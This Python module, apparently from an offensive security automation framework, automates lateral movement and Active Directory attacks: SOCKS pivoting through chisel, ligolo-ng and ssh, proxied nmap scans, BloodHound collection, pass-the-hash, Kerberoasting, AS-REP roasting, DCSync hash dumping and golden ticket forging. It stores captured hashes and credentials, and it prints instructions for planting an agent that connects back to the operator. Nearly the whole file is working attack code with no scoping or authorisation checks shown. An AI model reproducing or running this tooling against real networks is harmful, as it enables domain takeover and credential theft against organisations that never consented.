"""
LateralAgent — Module 19
Network pivoting, lateral movement, Active Directory attacks.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import os
import re
import shutil
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

from cryptography.fernet import Fernet

from app.config import settings
from database.db import SessionLocal
from database.models import LateralMovement


# ── Encryption ────────────────────────────────────────────────────────────────

def _get_fernet() -> Fernet:
    raw = hashlib.sha256(settings.JWT_SECRET.encode()).digest()
    key = base64.urlsafe_b64encode(raw)
    return Fernet(key)


def _encrypt(data: dict) -> str:
    return _get_fernet().encrypt(json.dumps(data).encode()).decode()


def _decrypt(token: str) -> dict:
    try:
        return json.loads(_get_fernet().decrypt(token.encode()).decode())
    except Exception:
        return {}


# ── Helpers ───────────────────────────────────────────────────────────────────

async def _run_cmd(
    args: list[str],
    timeout: int = 120,
    cwd: Optional[str] = None,
    env: Optional[dict] = None,
) -> tuple[int, str, str]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            env=env,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return -1, "", "Timeout"
        return proc.returncode, stdout.decode(errors="replace"), stderr.decode(errors="replace")
    except Exception as e:
        return -1, "", str(e)


def _tool_check(tool: str) -> Optional[dict]:
    if not shutil.which(tool):
        return {"available": False, "message": f"'{tool}' not found in PATH"}
    return None


def _db_session():
    return SessionLocal()


def _save_operation(
    op_id: str,
    operation_type: str,
    source_host: str,
    target_host: str,
    technique: str,
    credentials_used: dict,
    result: dict,
    success: bool,
):
    db = _db_session()
    try:
        op = LateralMovement(
            op_id=op_id,
            operation_type=operation_type,
            source_host=source_host,
            target_host=target_host,
            technique=technique,
            credentials_used=_encrypt(credentials_used),
            result=json.dumps(result),
            success=success,
            created_at=datetime.utcnow(),
        )
        db.add(op)
        db.commit()
    finally:
        db.close()


# ── Active proxy registry ─────────────────────────────────────────────────────

_active_proxies: dict[str, asyncio.subprocess.Process] = {}


# ── LateralAgent ──────────────────────────────────────────────────────────────

class LateralAgent:
    """
    Network pivoting, lateral movement, Active Directory attacks.
    All credential fields are encrypted at rest.
    """

    WORK_DIR = Path("./data/lateral")

    def __init__(self):
        self.WORK_DIR.mkdir(parents=True, exist_ok=True)

    # ── SOCKS proxy setup ─────────────────────────────────────────────────────

    async def setup_socks_proxy(
        self,
        target_ip: str,
        port: int = 1080,
        method: str = "chisel",
        ssh_creds: Optional[dict] = None,
    ) -> dict:
        """
        Setup SOCKS5 proxy via chisel, ligolo-ng, or ssh -D.
        Returns: socks5 proxy address for proxychains
        """
        op_id = str(uuid.uuid4())
        result: dict = {}
        success = False

        if method == "ssh":
            ssh_check = _tool_check("ssh")
            if ssh_check:
                return ssh_check

            if not ssh_creds:
                return {"error": "ssh_creds required for SSH method (username, password or key_path)"}

            username = ssh_creds.get("username", "root")
            password = ssh_creds.get("password")
            key_path = ssh_creds.get("key_path")

            cmd = [
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "BatchMode=yes" if key_path else "BatchMode=no",
                "-D", str(port),
                "-N",
                "-f",
            ]
            if key_path:
                cmd += ["-i", key_path]
            cmd.append(f"{username}@{target_ip}")

            rc, stdout, stderr = await _run_cmd(cmd, timeout=30)
            success = rc == 0
            result = {
                "method": "ssh",
                "proxy": f"socks5://127.0.0.1:{port}",
                "proxychains": f"socks5 127.0.0.1 {port}",
                "rc": rc,
                "stderr": stderr[:500],
            }

        elif method == "chisel":
            chisel = shutil.which("chisel")
            if not chisel:
                return {"available": False, "message": "chisel not found — download from github.com/jpillora/chisel"}

            proxy_key = f"{target_ip}:{port}"
            if proxy_key in _active_proxies:
                return {
                    "op_id": op_id,
                    "method": "chisel",
                    "proxy": f"socks5://127.0.0.1:{port}",
                    "proxychains": f"socks5 127.0.0.1 {port}",
                    "message": "Proxy already active",
                }

            # Start chisel client in background
            proc = await asyncio.create_subprocess_exec(
                chisel, "client",
                "--keepalive", "30s",
                f"{target_ip}:8080",
                f"socks",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            _active_proxies[proxy_key] = proc
            await asyncio.sleep(2)
            success = proc.returncode is None
            result = {
                "method": "chisel",
                "proxy": f"socks5://127.0.0.1:1080",
                "proxychains": "socks5 127.0.0.1 1080",
                "chisel_server_cmd": f"chisel server --socks5 --port 8080",
                "pid": proc.pid,
            }

        elif method == "ligolo":
            ligolo = shutil.which("ligolo-ng") or shutil.which("ligolo")
            if not ligolo:
                return {"available": False, "message": "ligolo-ng not found"}

            result = {
                "method": "ligolo-ng",
                "instructions": [
                    f"1. Start proxy: {ligolo} --selfcert --laddr 0.0.0.0:{port}",
                    f"2. Upload agent to {target_ip} and run: ./agent -connect YOUR_IP:{port} -ignore-cert",
                    "3. In ligolo console: session -> start",
                    "4. Add route: ip route add <target_subnet> dev ligolo",
                ],
                "proxy": f"ligolo tunnel on interface",
            }
            success = True
        else:
            return {"error": f"Unknown method '{method}'. Supported: ssh, chisel, ligolo"}

        _save_operation(
            op_id, "socks_proxy", "localhost", target_ip,
            "T1090.001",  # Proxy: Internal Proxy
            ssh_creds or {},
            result,
            success,
        )

        return {
            "op_id": op_id,
            "success": success,
            **result,
        }

    # ── Internal network discovery ────────────────────────────────────────────

    async def discover_internal_network(
        self, pivot_host: str, subnet: str
    ) -> dict:
        """
        Via proxychains + nmap: scan internal network.
        proxychains nmap -sT -Pn {subnet}
        """
        op_id = str(uuid.uuid4())

        # Check tools
        proxychains = shutil.which("proxychains4") or shutil.which("proxychains")
        nmap = shutil.which("nmap")

        if not nmap:
            return {"available": False, "message": "nmap not found"}

        cmd: list[str]
        if proxychains:
            cmd = [proxychains, "-q", "nmap", "-sT", "-Pn", "--open", "-T4", subnet]
        else:
            # Direct scan (fallback)
            cmd = ["nmap", "-sT", "-Pn", "--open", "-T4", subnet]

        rc, stdout, stderr = await _run_cmd(cmd, timeout=300)

        # Parse nmap output
        hosts = []
        for line in stdout.splitlines():
            m = re.match(r"Nmap scan report for (.+)", line)
            if m:
                hosts.append({"host": m.group(1), "ports": []})
            m_port = re.match(r"(\d+)/tcp\s+open\s+(\S+)", line)
            if m_port and hosts:
                hosts[-1]["ports"].append({
                    "port": int(m_port.group(1)),
                    "service": m_port.group(2),
                })

        result = {
            "subnet": subnet,
            "pivot_host": pivot_host,
            "hosts_found": len(hosts),
            "hosts": hosts,
            "raw_output": stdout[:3000],
            "via_proxychains": bool(proxychains),
        }

        _save_operation(op_id, "network_discovery", pivot_host, subnet, "T1018", {}, result, rc == 0)
        return {"op_id": op_id, "success": rc == 0, **result}

    # ── BloodHound collection ──────────────────────────────────────────────────

    async def bloodhound_collect(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str,
    ) -> dict:
        """
        Run BloodHound collector (bloodhound-python):
        bloodhound-python -d {domain} -u {user} -p {pass} -ns {dc} -c all
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("bloodhound-python") or shutil.which("bloodhound")
        if not tool:
            return {"available": False, "message": "bloodhound-python not found — pip install bloodhound"}

        work = self.WORK_DIR / op_id
        work.mkdir(parents=True, exist_ok=True)

        cmd = [
            tool,
            "-d", domain,
            "-u", username,
            "-p", password,
            "-ns", dc_ip,
            "-c", "all",
            "--zip",
            "-o", str(work),
        ]

        rc, stdout, stderr = await _run_cmd(cmd, timeout=600, cwd=str(work))

        zip_files = list(work.glob("*.zip"))
        result = {
            "domain": domain,
            "dc_ip": dc_ip,
            "output_dir": str(work),
            "zip_files": [str(z) for z in zip_files],
            "stdout": stdout[:2000],
            "stderr": stderr[:1000],
            "success": rc == 0 or bool(zip_files),
        }

        _save_operation(op_id, "bloodhound", "localhost", dc_ip, "T1087.002", {"username": username}, result, result["success"])
        return {"op_id": op_id, **result}

    # ── Pass-the-Hash ─────────────────────────────────────────────────────────

    async def pass_the_hash(
        self, target: str, username: str, ntlm_hash: str
    ) -> dict:
        """
        PTH via crackmapexec/netexec:
        cme smb {target} -u {user} -H {hash}
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("netexec") or shutil.which("crackmapexec") or shutil.which("cme")
        if not tool:
            return {"available": False, "message": "crackmapexec / netexec not found — pip install crackmapexec"}

        cmd = [tool, "smb", target, "-u", username, "-H", ntlm_hash]
        rc, stdout, stderr = await _run_cmd(cmd, timeout=120)

        # Parse CME output
        pwned = "[+] " in stdout and "Pwn3d!" in stdout
        auth_ok = "[+] " in stdout
        result = {
            "target": target,
            "username": username,
            "pwned": pwned,
            "auth_success": auth_ok,
            "output": stdout[:2000],
        }

        _save_operation(
            op_id, "pass_the_hash", "localhost", target, "T1550.002",
            {"username": username, "ntlm_hash": ntlm_hash},
            result, pwned or auth_ok,
        )
        return {"op_id": op_id, **result}

    # ── Kerberoasting ─────────────────────────────────────────────────────────

    async def kerberoast(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str,
    ) -> dict:
        """
        GetUserSPNs.py for Kerberoasting
        Impacket: GetUserSPNs.py domain/user:pass@dc -request
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
        if not tool:
            return {"available": False, "message": "GetUserSPNs.py not found — install impacket"}

        hashes_file = self.WORK_DIR / f"kerberoast_{op_id[:8]}.txt"
        cmd = [
            tool,
            f"{domain}/{username}:{password}@{dc_ip}",
            "-request",
            "-outputfile", str(hashes_file),
        ]

        rc, stdout, stderr = await _run_cmd(cmd, timeout=120)

        # Parse SPN hashes
        hashes: list[str] = []
        if hashes_file.exists():
            hashes = [l for l in hashes_file.read_text().splitlines() if l.startswith("$krb5tgs$")]

        # Count SPNs in output
        spns = re.findall(r"ServicePrincipalName\s+(.+)", stdout)

        result = {
            "domain": domain,
            "dc_ip": dc_ip,
            "spns_found": len(spns),
            "spn_list": spns[:20],
            "hashes_found": len(hashes),
            "hashes_file": str(hashes_file) if hashes else None,
            "hashes_preview": hashes[:3],
            "output": stdout[:2000],
        }

        _save_operation(op_id, "kerberoast", "localhost", dc_ip, "T1558.003", {"username": username}, result, bool(hashes))
        return {"op_id": op_id, **result}

    # ── AS-REP Roasting ───────────────────────────────────────────────────────

    async def asreproast(
        self,
        domain: str,
        dc_ip: str,
        userlist: Optional[str] = None,
    ) -> dict:
        """
        GetNPUsers.py for AS-REP Roasting.
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if not tool:
            return {"available": False, "message": "GetNPUsers.py not found — install impacket"}

        hashes_file = self.WORK_DIR / f"asreproast_{op_id[:8]}.txt"
        cmd = [
            tool,
            f"{domain}/",
            "-dc-ip", dc_ip,
            "-request",
            "-no-pass",
            "-format", "hashcat",
            "-outputfile", str(hashes_file),
        ]

        if userlist and Path(userlist).exists():
            cmd += ["-usersfile", userlist]

        rc, stdout, stderr = await _run_cmd(cmd, timeout=120)

        hashes: list[str] = []
        if hashes_file.exists():
            hashes = [l for l in hashes_file.read_text().splitlines() if l.startswith("$krb5asrep$")]

        result = {
            "domain": domain,
            "dc_ip": dc_ip,
            "hashes_found": len(hashes),
            "hashes_file": str(hashes_file) if hashes else None,
            "hashes_preview": hashes[:3],
            "output": stdout[:2000],
        }

        _save_operation(op_id, "asreproast", "localhost", dc_ip, "T1558.004", {}, result, bool(hashes))
        return {"op_id": op_id, **result}

    # ── DCSync ────────────────────────────────────────────────────────────────

    async def dcsync(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str,
        target_user: str = "Administrator",
    ) -> dict:
        """
        secretsdump.py DCSync attack.
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not tool:
            return {"available": False, "message": "secretsdump.py not found — install impacket"}

        dump_file = self.WORK_DIR / f"dcsync_{op_id[:8]}.txt"
        cmd = [
            tool,
            f"{domain}/{username}:{password}@{dc_ip}",
            "-just-dc-user", target_user,
            "-outputfile", str(dump_file),
        ]

        rc, stdout, stderr = await _run_cmd(cmd, timeout=180)

        # Extract hashes from output
        nt_hashes = re.findall(r"Administrator:[\d]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::", stdout)
        generic_hashes = re.findall(r"\w+:[\d]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", stdout)

        result = {
            "domain": domain,
            "dc_ip": dc_ip,
            "target_user": target_user,
            "hashes_found": len(generic_hashes),
            "nt_hash_found": bool(nt_hashes),
            "output_preview": stdout[:3000],
            "dump_file": str(dump_file),
        }

        _save_operation(
            op_id, "dcsync", "localhost", dc_ip, "T1003.006",
            {"username": username},
            result, bool(generic_hashes),
        )
        return {"op_id": op_id, **result}

    # ── Golden Ticket ─────────────────────────────────────────────────────────

    async def golden_ticket(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
    ) -> dict:
        """
        Generate golden ticket via impacket ticketer.py.
        """
        op_id = str(uuid.uuid4())
        tool = shutil.which("ticketer.py") or shutil.which("impacket-ticketer")
        if not tool:
            return {"available": False, "message": "ticketer.py not found — install impacket"}

        ticket_file = self.WORK_DIR / f"golden_{op_id[:8]}"
        cmd = [
            tool,
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "Administrator",
        ]

        rc, stdout, stderr = await _run_cmd(
            cmd, timeout=60, cwd=str(self.WORK_DIR)
        )

        ccache_file = self.WORK_DIR / "Administrator.ccache"
        result = {
            "domain": domain,
            "domain_sid": domain_sid,
            "ticket_file": str(ccache_file) if ccache_file.exists() else None,
            "success": rc == 0,
            "output": stdout[:1000],
            "usage": [
                f"export KRB5CCNAME={ccache_file}",
                f"python3 {shutil.which('psexec.py') or 'psexec.py'} -k -no-pass {domain}/Administrator@<dc>",
            ],
        }

        _save_operation(op_id, "golden_ticket", "localhost", domain, "T1558.001", {"krbtgt_hash": krbtgt_hash}, result, rc == 0)
        return {"op_id": op_id, **result}

    # ── SMB shares ────────────────────────────────────────────────────────────

    async def smb_shares_enum(
        self,
        target: str,
        credentials: Optional[dict] = None,
    ) -> dict:
        """
        Enumerate SMB shares via smbclient, crackmapexec, or impacket.
        """
        op_id = str(uuid.uuid4())
        cme = shutil.which("netexec") or shutil.which("crackmapexec") or shutil.which("cme")
        smbclient = shutil.which("smbclient")

        if not cme and not smbclient:
            return {"available": False, "message": "crackmapexec/netexec or smbclient required"}

        shares: list = []
        output = ""

        if cme:
            cmd = [cme, "smb", target, "--shares"]
            if credentials:
                cmd += ["-u", credentials.get("username", ""), "-p", credentials.get("password", "")]
                if credentials.get("ntlm_hash"):
                    cmd += ["-H", credentials["ntlm_hash"]]
                if credentials.get("null_session"):
                    cmd += ["-u", "", "-p", ""]
            rc, stdout, _ = await _run_cmd(cmd, timeout=60)
            output = stdout[:3000]
            for line in stdout.splitlines():
                m = re.search(r"(PRINT|DISK|IPC)\s+(\S+)", line)
                if m:
                    shares.append({"name": m.group(2), "type": m.group(1)})
                # More flexible parse
                m2 = re.search(r"\s(\S+)\s+(READ|WRITE|NO ACCESS|FULL)", line)
                if m2:
                    shares.append({"name": m2.group(1), "access": m2.group(2)})

        elif smbclient:
            cmd = [smbclient, "-L", f"//{target}", "-N"]
            if credentials:
                u = credentials.get("username", "")
                p = credentials.get("password", "")
                cmd = [smbclient, "-L", f"//{target}", f"-U{u}%{p}"]
            rc, stdout, _ = await _run_cmd(cmd, timeout=30)
            output = stdout[:2000]
            for line in stdout.splitlines():
                m = re.match(r"\s+(\S+)\s+(Disk|Printer|IPC)", line)
                if m:
                    shares.append({"name": m.group(1), "type": m.group(2)})

        result = {
            "target": target,
            "shares_found": len(shares),
            "shares": shares,
            "output_preview": output,
        }

        _save_operation(op_id, "smb_enum", "localhost", target, "T1135", credentials or {}, result, bool(shares))
        return {"op_id": op_id, **result}

    # ── History ───────────────────────────────────────────────────────────────

    async def get_history(self, limit: int = 50) -> list:
        """Get lateral movement operation history."""
        db = _db_session()
        try:
            ops = (
                db.query(LateralMovement)
                .order_by(LateralMovement.created_at.desc())
                .limit(limit)
                .all()
            )
            result = []
            for op in ops:
                result.append({
                    "op_id": op.op_id,
                    "operation_type": op.operation_type,
                    "source_host": op.source_host,
                    "target_host": op.target_host,
                    "technique": op.technique,
                    "success": op.success,
                    "result": json.loads(op.result or "{}"),
                    "created_at": op.created_at.isoformat() if op.created_at else None,
                })
            return result
        finally:
            db.close()
